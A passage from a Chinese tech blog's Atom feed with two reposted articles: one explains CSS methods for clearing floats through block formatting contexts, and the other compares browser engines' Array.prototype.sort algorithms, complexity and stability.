<code>.textDiv</code> 应用 clear 清除浮动，撑起父级元素高度的原理完全一样。这里强调一点，即，在父级元素末尾添加的元素必须是一个 <strong> 块级元素 </strong>，否则无法撑起父级元素高度。</p><h2 id="3-利用伪元素（clearfix）"><a href="#3-利用伪元素（clearfix）" class="headerlink" title="3. 利用伪元素（clearfix）"></a>3. 利用伪元素（clearfix）</h2><p>HTML 结构如下，为了惯例相符，在 <code>.topDiv</code> 的 div 上再添加一个 clearfix 类：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"topDiv clearfix"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"textDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"floatDiv"</span>&gt;</span>float left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottomDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>样式应用如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 省略基本的样式</span><br><span class="line">// 区别在这里</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">'.'</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该样式在 <code>clearfix</code> ，即父级元素的最后，添加了一个 <code>:after</code> 伪元素，通过清除伪元素的浮动，达到撑起父元素高度的目的。注意到该伪元素的 <code>display</code> 值为 <code>block</code>，即，它是一个不可见的块级元素（有的地方使用 <code>table</code>，因为 <code>table</code> 也是一个块级元素）。你可能已经意识到，这也只不过是前一种清除浮动方法（添加空白 div）的另一种变形，其底层逻辑也是完全一样的。前面的三种方法，其本质上是一样的。</p><h2 id="4-利用-overflow-清除浮动"><a href="#4-利用-overflow-清除浮动" class="headerlink" title="4. 利用 overflow 清除浮动"></a>4. 利用 overflow 清除浮动</h2><p>首先直观地看看，<code>overflow</code> 是如何清除浮动的。<br>HTML 结构如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"topDiv"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"floatDiv"</span>&gt;</span>float left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"textDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottomDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>样式应用如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.topDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid black;</span><br><span class="line"></span><br><span class="line">    // 区别在这里</span><br><span class="line">    <span class="selector-tag">overflow</span>: <span class="selector-tag">auto</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.floatDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dotted red;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bottomDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dotted black;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.textDiv</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>不应用上面标识出来的 CSS 时，渲染结果和本文开始的第一个图形效果相同，应用 CSS 后的渲染效果如下：<br><img src="/images/2018/08/cb75fb0469d3316e2ca6192f8316f7cb.webp" alt=""></p><p>仅仅只在父级元素上添加了一个值为 auto 的 overflow 属性，父元素的高度立即被撑起，将浮动元素包裹在内。看起来，浮动被清除了，浮动不再会影响到后续元素的渲染（严格讲，这和清除浮动没有一点关系，因为不存在哪个元素的浮动被清除，不纠结这个问题）。其实，这里的 overflow 值，还可以是除了 “visible” 之外的任何有效值，它们都能达到撑起父元素高度，清除浮动的目的。不过，有的值可能会带来副作用，比如，scroll 值会导致滚动条始终可见，hidden 会使得超出边框部分不可见等。那它们是如何做到浮动清除的呢？</p><p>要讲清楚这个解决方案的原理，有一个概念始终是绕不过去，那就是<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context" rel="external nofollow noopener noreferrer" target="_blank">块格式化上下文(BFC)</a>, 然而这又是一个非常抽象的概念，如果要清楚地把这个概念讲出来，恐怕需要非常大的篇幅，这里仅提及和理解该问题相关的内容。</p><p>这是从 <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context" rel="external nofollow noopener noreferrer" target="_blank">MDN</a> 上摘下来的 BFC 定义：</p><blockquote><p>A block formatting context is a part of a visual CSS rendering of a Web page. It is the region in which the layout of block boxes occurs and in which floats interact with each other.</p></blockquote><p>翻译过来就是：块级格式化上下文是 CSS 可视化渲染的一部分。它是一块区域，规定了内部块盒的渲染方式，以及浮动相互之间的影响关系。<br>块格式化上下文（BFC）有下面几个特点：</p><ol><li>BFC 是就像一道屏障，隔离出了 BFC 内部和外部，内部和外部区域的渲染相互之间不影响。BFC 有自己的一套内部子元素渲染的规则，不影响外部渲染，也不受外部渲染影响。</li><li>BFC 的区域不会和外部浮动盒子的外边距区域发生叠加。也就是说，外部任何浮动元素区域和 BFC 区域是泾渭分明的，不可能重叠。</li><li>BFC 在计算高度的时候，内部浮动元素的高度也要计算在内。也就是说，即使 BFC 区域内只有一个浮动元素，BFC 的高度也不会发生塌缩，高度是大于等于浮动元素的高度的。</li><li>HTML 结构中，当构建 BFC 区域的元素紧接着一个浮动盒子时，即，是该浮动盒子的兄弟节点，BFC 区域会首先尝试在浮动盒子的旁边渲染，但若宽度不够，就在浮动元素的下方渲染。<a href="https://www.w3.org/TR/CSS2/visuren.html#bfc-next-to-float" rel="external nofollow noopener noreferrer" target="_blank">[看这里]</a></li></ol><p>有了这几点，就可以尝试解释为什么 <code>overflow</code> （值不为 <code>visible</code>）可以清除浮动了。<br>当元素设置了 <code>overflow</code> 样式，且值不为 <code>visible</code> 时，该元素就建构了一个 BFC(哪些情况下，元素可以建构出 BFC，可以看查看 CSS 文档对 BFC 的定义)。在我们的例子中，<code>.topDiv</code> 因设置了值为 <code>auto</code> 的 <code>overflow</code> 样式，所以该元素建构出一个 BFC，按照第三个特点，BFC 的高度是要包括浮动元素的，所以 <code>.topDiv</code> 的高度被撑起来，达到了清除浮动影响的目的。(至于为什么值为 <code>visible</code> 的 <code>overflow</code> 不能建构 BFC，<a href="https://stackoverflow.com/questions/9943503/why-does-css2-1-define-overflow-values-other-than-visible-to-establish-a-new-b?answertab=votes#tab-top" rel="external nofollow noopener noreferrer" target="_blank">这个答案</a>给了一个解释)</p><p>其实，这里 overflow 的作用就是为了构建一个 BFC 区域，让内部浮动的影响都得以“内化”。如果你看了<a href="https://www.w3.org/TR/CSS2/visuren.html#block-formatting" rel="external nofollow noopener noreferrer" target="_blank">BFC 的定义</a>，你会发现，构建一个 BFC 区域的方法有很多种，<code>overflow</code> 只是其中的一种，那在这里，我们是否也可以利用其它的方式构建 BFC，且同样能达到清除浮动的目的呢？</p><p>BFC 定义中说，<code>inline-block</code> 同样也能构建 BFC，那我们就用该样式来试试：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.topDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid black;</span><br><span class="line"></span><br><span class="line">    // 区别在这里</span><br><span class="line">    <span class="selector-tag">display</span>: <span class="selector-tag">inline-block</span>;</span><br><span class="line">&#125;</span><br><span class="line">// 其他样式相同，省略</span><br></pre></td></tr></table></figure></p><p>渲染效果如下：<br><img src="/images/2018/08/aa859ff15404ede93450f03430b2d3ba.webp" alt=""></p><p>效果完全一样！只要我们理解了原理，就可以灵活演变出不同的清除浮动的方法，而不必死记某种手段。</p><p>当然，要说明的是，在实际项目中选择采用哪种方式构建 BFC 是要具体问题具体分析的，因为要考虑到选用的样式自身的作用和影响。这个例子中，选用 <code>inline-block</code> 和选用 <code>overflow</code> 效果完全一样，没有看出有什么副作用，但不代表在其他项目中一样能行得通。甚至对 <code>overflow</code> 值的选择也要考虑其表现和影响。在各种构建 BFC 的方式中，<code>overflow</code> 方式可能是外部影响更可控的一种，我猜想这也许就是为什么普遍采用 <code>overflow</code> 来清除浮动的原因吧。</p><p>到这里，我要分享的清除浮动的方法已经讲完了。其实，如果在不同的使用场景下，对这几个方法进行拆分组合(其实是对底层原理的拆分组合)，还可以实现其他形式不同的清除浮动的方法，最重要的还是对底层原理的把握。知其然，亦知其所以然才是最有效的学习方式。</p><p>下面是文中涉及的链接汇总：</p><ol><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context" rel="external nofollow noopener noreferrer" target="_blank">MDN 对 BFC 的定义</a></li><li><a href="https://www.w3.org/TR/CSS2/visuren.html#block-formatting" rel="external nofollow noopener noreferrer" target="_blank">CSS 文档对 BFC 的定义和解释，BFC 如何创建，BFC 内部渲染规则</a></li><li><a href="https://stackoverflow.com/questions/9943503/why-does-css2-1-define-overflow-values-other-than-visible-to-establish-a-new-b?answertab=votes#tab-top" rel="external nofollow noopener noreferrer" target="_blank">为什么 overflow 的值为 visible 时，无法清除浮动，而其他值可以，Stack Overflow 上的一个回答</a></li><li><a href="https://www.w3.org/TR/CSS2/visuren.html#bfc-next-to-float" rel="external nofollow noopener noreferrer" target="_blank">BFC 紧跟浮动元素时如何渲染</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转自：&lt;a href=&quot;https://juejin.im/post/59e7190bf265da4307025d91&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;https://juejin.im/post/59e7190bf265da4307025d91&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文介绍了四种清除浮动的方法，并尝试解释其原理。在理解了各种清除浮动的原理之后，你会发现，很多清除浮动的方法本质上其实是一样的。掌握这些原理，相信你可以根据场景和需求，灵活运用原则发展出不同的清除浮动的方法，而不再死记或拘泥于文中提到的方法。&lt;/p&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="HTML5" scheme="https://hexo.bangz.me/tags/HTML5/"/>
    
      <category term="CSS3" scheme="https://hexo.bangz.me/tags/CSS3/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出浏览器 js 的数组排序算法</title>
    <link href="https://hexo.bangz.me/archives/sort-algorithm-implement-in-browser.html"/>
    <id>https://hexo.bangz.me/archives/sort-algorithm-implement-in-browser.html</id>
    <published>2018-08-11T02:42:40.000Z</published>
    <updated>2018-08-11T03:24:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="https://segmentfault.com/a/1190000010648740" rel="external nofollow noopener noreferrer" target="_blank">https://segmentfault.com/a/1190000010648740</a></p><h1 id="本文要解决的问题"><a href="#本文要解决的问题" class="headerlink" title="本文要解决的问题"></a>本文要解决的问题</h1><pre><code>1、找出 Array.prototype.sort 使用的什么排序算法 2、用一种直观的方式展示 Array.prototype.sort 的时间复杂度，看看它有多快？  3、实际开发中要注意的问题  </code></pre><a id="more"></a><h1 id="Array-prototype-sort-各浏览器的算法实现"><a href="#Array-prototype-sort-各浏览器的算法实现" class="headerlink" title="Array.prototype.sort 各浏览器的算法实现"></a><code>Array.prototype.sort</code> 各浏览器的算法实现</h1><p><a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.4.4.11" rel="external nofollow noopener noreferrer" target="_blank">ECMAScript 5.1</a></p><p><a href="http://www.ecma-international.cma-262/6.0/#sec-array.prototype.sort" rel="external nofollow noopener noreferrer" target="_blank">ECMAScript 6.0</a></p><p><a href="http://www.ecma-international.org/ecma-262/6.0/#sec-array.prototype.sort" rel="external nofollow noopener noreferrer" target="_blank">ECMAScript 草案</a></p><p>看完上面三个规范中 <code>Array.prototype.sort</code> 部分，我们会发现 <code>ECMAScript</code> 不同版本规范对 <code>Array.prototype.sort</code> 的定义中没有要求用什么样的排序方式实现 <code>sort()</code> 方法，也没有要求是否要采用稳定排序算法（下文会解释什么是稳定排序算法）。</p><p>因此各浏览器都给出自己的实现方式：</p><p>表格内容部分来自于<a href="https://zh.wikipedia.org/wiki/JavaScript%E5%BC%95%E6%93%8E" rel="external nofollow noopener noreferrer" target="_blank">维基百科</a></p><table><thead><tr><th>浏览器</th><th>使用的 JavaScript 引擎</th><th>排序算法</th><th>源码地址</th></tr></thead><tbody><tr><td>Google Chrome</td><td>V8</td><td>插入排序和快速排序</td><td><a href="https://github.com/v8/v8/blob/master/src/js/array.js#L768" rel="external nofollow noopener noreferrer" target="_blank"><code>sort</code> 源码实现</a></td></tr><tr><td>Mozilla Firefox</td><td>SpiderMonkey</td><td>归并排序</td><td><a href="https://github.com/mozilla/gecko-dev/blob/master/js/src/jsarray.cpp" rel="external nofollow noopener noreferrer" target="_blank"><code>sort</code> 源码实现</a></td></tr><tr><td>Safari</td><td>Nitro（JavaScriptCore）</td><td>归并排序和桶排序</td><td><a href="https://github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/builtins/ArrayPrototype.js#L423" rel="external nofollow noopener noreferrer" target="_blank"><code>sort</code> 源码实现 </a></td></tr><tr><td>Microsoft Edge 和 IE(9+)</td><td>Chakra</td><td>快速排序</td><td><a href="https://github.com/Microsoft/ChakraCore/blob/master/lib/Common/DataStructures/QuickSort.h" rel="external nofollow noopener noreferrer" target="_blank"><code>sort</code> 源码实现</a></td></tr></tbody></table><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><code>V8</code> 引擎的一段注释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In-place QuickSort algorithm.</span></span><br><span class="line"><span class="comment">// For short (length &lt;= 10) arrays, insertion sort is used for efficiency.</span></span><br></pre></td></tr></table></figure><p><code>Google Chrome</code> 对 <code>sort</code> 做了特殊处理，对于长度 <code>&lt;= 10</code> 的数组使用的是插入排序(稳定排序算法) ，&gt;10 的数组使用的是快速排序。快速排序是不稳定的排序算法。</p><p>但是很明显比我们常见的快速排序要复杂得多，不过核心算法还是快速排序。算法复杂的原因在于 v8 出于性能考虑进行了很多优化。</p><p>再看 <code>safari</code> <code>Nitro</code> 引擎的一段代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> comparator == <span class="string">"function"</span>)</span><br><span class="line">  comparatorSort(array, length, comparator);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (comparator === <span class="literal">null</span> || comparator === @<span class="literal">undefined</span>)</span><br><span class="line">  stringSort(array, length);</span><br><span class="line"></span><br><span class="line">  省略....</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringSort</span>(<span class="params">array, length</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> valueCount = compact(array, length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> strings = @newArrayWithSize(valueCount);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; valueCount; ++i)</span><br><span class="line">      strings[i] = &#123; <span class="attr">string</span>: @toString(array[i]), <span class="attr">value</span>: array[i] &#125;;</span><br><span class="line"></span><br><span class="line">  bucketSort(array, <span class="number">0</span>, strings, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  省略....</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">comparatorSort</span>(<span class="params">array, length, comparator</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> valueCount = compact(array, length);</span><br><span class="line">  mergeSort(array, valueCount, comparator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认使用的桶排序，如果 <code>sort</code> 传入的自定义函数作为参数，就是用归并排序（稳定排序算法）</p><p><code>Firefox</code> 源码就不贴了，上面的表格有源码地址，使用的稳定排序算法 — 归并算法。<br><code>Microsoft Edge</code> 和 <code>IE(9+)</code> 使用的不稳定排序算法 - 快速排序。<br>但是 IE（6、7、8）使用的稳定算法。</p><h2 id="各种算法的对比"><a href="#各种算法的对比" class="headerlink" title="各种算法的对比"></a>各种算法的对比</h2><table><thead><tr><th>排序类型</th><th>平均情况</th><th>最好情况</th><th>最坏情况</th><th>辅助空间</th><th>稳定性</th></tr></thead><tbody><tr><td>快速排序</td><td>O(nlogn)</td><td>O(nlogn)</td><td>O(n²)</td><td>O(nlogn)</td><td>不稳定</td></tr><tr><td>归并排序</td><td>O(nlogn)</td><td>O(nlogn)</td><td>O(nlogn)</td><td>O(n)</td><td>稳定</td></tr><tr><td>插入排序</td><td>O(n²)</td><td>O(n)</td><td>O(n²)</td><td>O(1)</td><td>稳定</td></tr><tr><td>桶排序</td><td>O(n+k)</td><td>O(n+k)</td><td>O(n²)</td><td>O(n+k)</td><td>(不)稳定</td></tr></tbody></table><p>注: 桶排序的稳定性取决于桶内排序的稳定性, 因此其稳定性不确定。</p><p><strong> 算法时间复杂度 </strong></p><pre><code>在进行算法分析时，语句总的执行次数 T(n)是关于问题规模 n 的函数，进而分析 T(n)随着 n 的变化情况并确定 T(n)的数量级。算法的时间复杂度，也就是算法的时间度量，记作：T(n)=O(f(n))。它表示随问题规模 n 的增大，算法执行时间的增长率和 f(n)的增长率相同，称作算法的时间复杂度，简称为时间复杂度。其中 f(n)是问题规模 n 的某个函数。</code></pre><p><strong> 常用的时间复杂度所耗费的时间从小到大依次是 </strong></p><p>O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n²) &lt; O(n³) &lt; O(2^n) &lt; O(n!) &lt; O(n^n)</p><p><img src="/images/2018/08/006tNc79ly1fij5oloa7fj319o0wo424.jpg" alt=""></p><p><a href="http://bigocheatsheet.com/" rel="external nofollow noopener noreferrer" target="_blank">图片来源</a></p><p>算法的时间复杂度与运行时间有一些常见的比例关系 <a href="http://www.cnblogs.com/gaochundong/p/complexity_of_algorithms.html" rel="external nofollow noopener noreferrer" target="_blank">查看图表来源</a></p><table><thead><tr><th>复杂度</th><th>10</th><th>20</th><th>50</th><th>100</th><th>1,000</th><th>10,000</th><th>100,000</th></tr></thead><tbody><tr><td>O(1)</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td></tr><tr><td>O(log(n))</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td></tr><tr><td>O(n)</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td></tr><tr><td>O(n*log(n))</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td></tr><tr><td>O(n²)</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>2 s</td><td>3-4 min</td></tr><tr><td>O(n³)</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>&lt; 1s</td><td>20 s</td><td>5 hours</td><td>231 days</td></tr><tr><td>O(2^n)</td><td>&lt; 1s</td><td>&lt; 1s</td><td>260 days</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td></tr><tr><td>O(n!)</td><td>&lt; 1s</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td></tr><tr><td>O(n^n)</td><td>3-4 min</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td><td>hangs</td></tr></tbody></table><p><strong> 维基百科关于算法稳定性的解释 </strong></p><blockquote><p>当相等的元素是无法分辨的，比如像是整数，稳定性并不是一个问题。然而，假设以下的数对将要以他们的第一个数字来排序。</p></blockquote><pre><code>(4, 1) (3, 1) (3, 7)（5, 6）</code></pre><p>在这个状况下，有可能产生两种不同的结果，一个是让相等键值的纪录维持相对的次序，而另外一个则没有：</p><pre><code>(3, 1)  (3, 7)  (4, 1)  (5, 6)  (维持次序）(3, 7)  (3, 1)  (4, 1)  (5, 6) （次序被改变）</code></pre><p><strong> 想看自己浏览器排序算法的稳定性？</strong> <a href="http://ofb.net/~sethml/is-sort-stable.html" rel="external nofollow noopener noreferrer" target="_blank">点我</a></p><h1 id="各种排序算法实现有多快？"><a href="#各种排序算法实现有多快？" class="headerlink" title="各种排序算法实现有多快？"></a>各种排序算法实现有多快？</h1><p>我们先通过这个 <a href="http://math.hws.edu/eck/js/sorting/xSortLab.html" rel="external nofollow noopener noreferrer" target="_blank">在线网站</a> 大体测试一下</p><p><img src="/images/2018/08/006tNc79ly1fij7d6mhr8j314607i75u.jpg" alt=""></p><p>对一个有 10000 个元素的数组，快速排序 &gt; 归并排序 &gt;&gt;&gt; 插入排序<br>而且插入排序大于 1s 了。  </p><p>对于一个只有 10 个元素的数组，插入排序 &gt; 快速排序<br>这也说明了为什么 <code>chrome</code> 在小于等于 10 个元素的小数组使用插入排序的原因了。</p><h1 id="浏览器的实现不同有什么影响"><a href="#浏览器的实现不同有什么影响" class="headerlink" title="浏览器的实现不同有什么影响"></a>浏览器的实现不同有什么影响</h1><p>排序算法不稳定有什么影响</p><p>举个例子：</p><p>某市的机动车牌照拍卖系统，最终中标的规则为：</p><p>1、按价格进行倒排序；</p><p>2、相同价格则按照竞标顺位（即价格提交时间）进行正排序。</p><p>排序若是在前端进行，那么采用快速排序的浏览器中显示的中标者很可能是不符合预期的。</p><p><strong> 解决办法 </strong></p><p><a href="http://ued.ctrip.com/blog/array-prototype-sort-differences-in-different-browsers-and-solution.html" rel="external nofollow noopener noreferrer" target="_blank">Array.prototype.sort 在不同浏览器中的差异和解决办法</a></p><p>大体的思路就是，自己写一个稳定的排序函数，以保持各浏览器的一致性。</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>1、<a href="http://math.hws.edu/eck/js/sorting/xSortLab.html" rel="external nofollow noopener noreferrer" target="_blank">在线排序算法对比网站</a><br>2、<a href="http://jsdo.it/norahiko/oxIy/fullscreen" rel="external nofollow noopener noreferrer" target="_blank">排序算法视觉图</a>  </p><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p>1、<a href="http://www.ruanyifeng.com/blog/2011/04/quicksort_in_javascript.html?bsh2" rel="external nofollow noopener noreferrer" target="_blank">快速排序（Quicksort）的 Javascript 实现</a><br>2、<a href="http://louiszhai.github.io/2016/12/23/sort/#" rel="external nofollow noopener noreferrer" target="_blank">JS 中可能用得到的全部的排序算法</a><br>3、<a href="http://www.cnblogs.com/tsingke/p/5347660.html" rel="external nofollow noopener noreferrer" target="_blank">7 种常用的排序算法 - 可视化</a><br>4、<a href="http://www.iteye.com/topic/1138374" rel="external nofollow noopener noreferrer" target="_blank">深入了解 javascript 的 sort 方法</a><br>5、<a href="http://www.qcyoung.com/2016/12/18/JavaScript%20%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B1%87%E6%80%BB/" rel="external nofollow noopener noreferrer" target="_blank">JavaScript 排序算法汇总</a>  </p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://efe.baidu.com/blog/talk-about-sort-in-front-end/" rel="external nofollow noopener noreferrer" target="_blank">聊聊前端排序的那些事</a><br><a href="https://zh.wikipedia.org/wiki/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95#.E7.A9.A9.E5.AE.9A.E6.80.A7" rel="external nofollow noopener noreferrer" target="_blank">排序算法</a><br><a href="http://www.qcyoung.com/2016/12/18/JavaScript%20%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B1%87%E6%80%BB/" rel="external nofollow noopener noreferrer" target="_blank">JavaScript 排序算法汇总</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转自：&lt;a href=&quot;https://segmentfault.com/a/1190000010648740&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;https://segmentfault.com/a/1190000010648740&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;本文要解决的问题&quot;&gt;&lt;a href=&quot;#本文要解决的问题&quot; class=&quot;headerlink&quot; title=&quot;本文要解决的问题&quot;&gt;&lt;/a&gt;本文要解决的问题&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;1、找出 Array.prototype.sort 使用的什么排序算法 

2、用一种直观的方式展示 Array.prototype.sort 的时间复杂度，看看它有多快？  

3、实际开发中要注意的问题  
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
  </entry>
  
  <entry>
    <title>浅谈前端安全</title>
    <link href="https://hexo.bangz.me/archives/about-frontend-security.html"/>
    <id>https://hexo.bangz.me/archives/about-frontend-security.html</id>
